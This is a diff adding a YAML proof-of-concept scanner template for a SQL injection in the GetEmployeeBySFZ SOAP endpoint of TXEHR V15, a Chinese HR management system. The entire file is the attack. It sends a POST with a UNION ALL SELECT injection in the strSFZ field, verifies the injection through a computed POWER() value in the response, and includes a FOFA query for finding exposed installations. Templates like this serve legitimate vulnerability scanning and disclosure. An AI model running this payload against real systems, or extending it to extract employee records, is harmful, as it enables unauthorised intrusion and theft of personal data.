@@ -1,0 +1,25 @@
+id: poc-yaml-tosharesoft-getemployeebysfz-sqli
+info:
+  name: 同享人力资源管理系统-TXEHR V15 GetEmployeeBySFZ接口存在SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 同享人力资源管理系统
+  fofa: body="/Assistant/Default.aspx"
+variables:
+  t1: random_int(100,500)
+  t2: t1 * t1 * t1
+requests:
+- method: POST
+  path: /Service/SFZService.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: http://tempuri.org/GetEmployeeBySFZ
+  data: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ xmlns:tem=\"http://tempuri.org/\">\n<soapenv:Header/>\n<soapenv:Body>\n    \
+    \  <tem:GetEmployeeBySFZ>\n         <!--type: string-->\n         <tem:strSFZ>-1'UNION\
+    \ ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(select\
+    \ POWER({{.t1}},3)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--\
+    \ hExp</tem:strSFZ>\n      </tem:GetEmployeeBySFZ>\n   </soapenv:Body>\n</soapenv:Envelope>"
+  expression: "status_code == 200 && \ncontains(body,t2)\n"
+transport: http
